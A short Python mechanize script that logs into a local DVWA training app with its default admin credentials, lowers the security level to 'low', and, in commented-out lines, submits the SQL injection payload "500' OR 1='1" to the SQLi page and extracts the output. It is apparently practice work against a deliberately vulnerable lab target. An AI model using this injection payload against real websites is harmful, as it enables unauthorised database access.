import mechanize
import re
br=mechanize.Browser()
br.set_handle_robots(False)
br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
print(br)
br.select_form(nr=0)
br["username"]='admin'
br["password"]='password'
sub=br.submit()
print(sub.geturl())
br.open("http://localhost/DVWA-master/security.php")
br.select_form(nr=0)
br["security"] = ["low"]
sub = br.submit()
print(sub.read())
print(sub.geturl())
#br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
#br.select_form(nr=0)
#br["id"]="500' OR 1='1"
#sub=br.submit()
#print(sub.geturl())
#content = sub.read().decode("utf-8")
#print(content)
#beg = content.find(b'<pre>')
#end = content.find(b'</pre>')
#print(beg,end)
#print(content[beg:end])
#print(re.match("First Name",content))
